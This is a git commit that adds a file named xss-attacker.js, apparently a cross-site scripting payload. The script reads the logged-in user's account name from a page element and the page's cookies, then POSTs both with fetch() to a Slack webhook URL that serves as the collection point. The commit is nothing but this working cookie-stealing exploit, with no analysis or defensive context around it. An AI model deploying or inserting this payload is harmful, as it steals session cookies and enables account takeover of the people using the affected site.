8cce98f8bda82c016c972425cfa5c3d05548486d
Jizu Sun <jizu.sun@sap.com>
2018-12-26 09:29:12 +0800

    xss script

---
+++ xss-attacker.js
@@ -0,0 +1,14 @@
+var text = `
+    User: ${document.querySelector('#__jsview0--headItem-Account-name').innerHTML}
+    
+    Cookie: ${document.cookie}
+`;
+var url = 'https://hooks.slack.com/services/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';
+fetch(url, {
+    method: 'post',
+    body: JSON.stringify({
+        text: text
+    })
+}).then(function(response) {
+    console.log(response);
+})
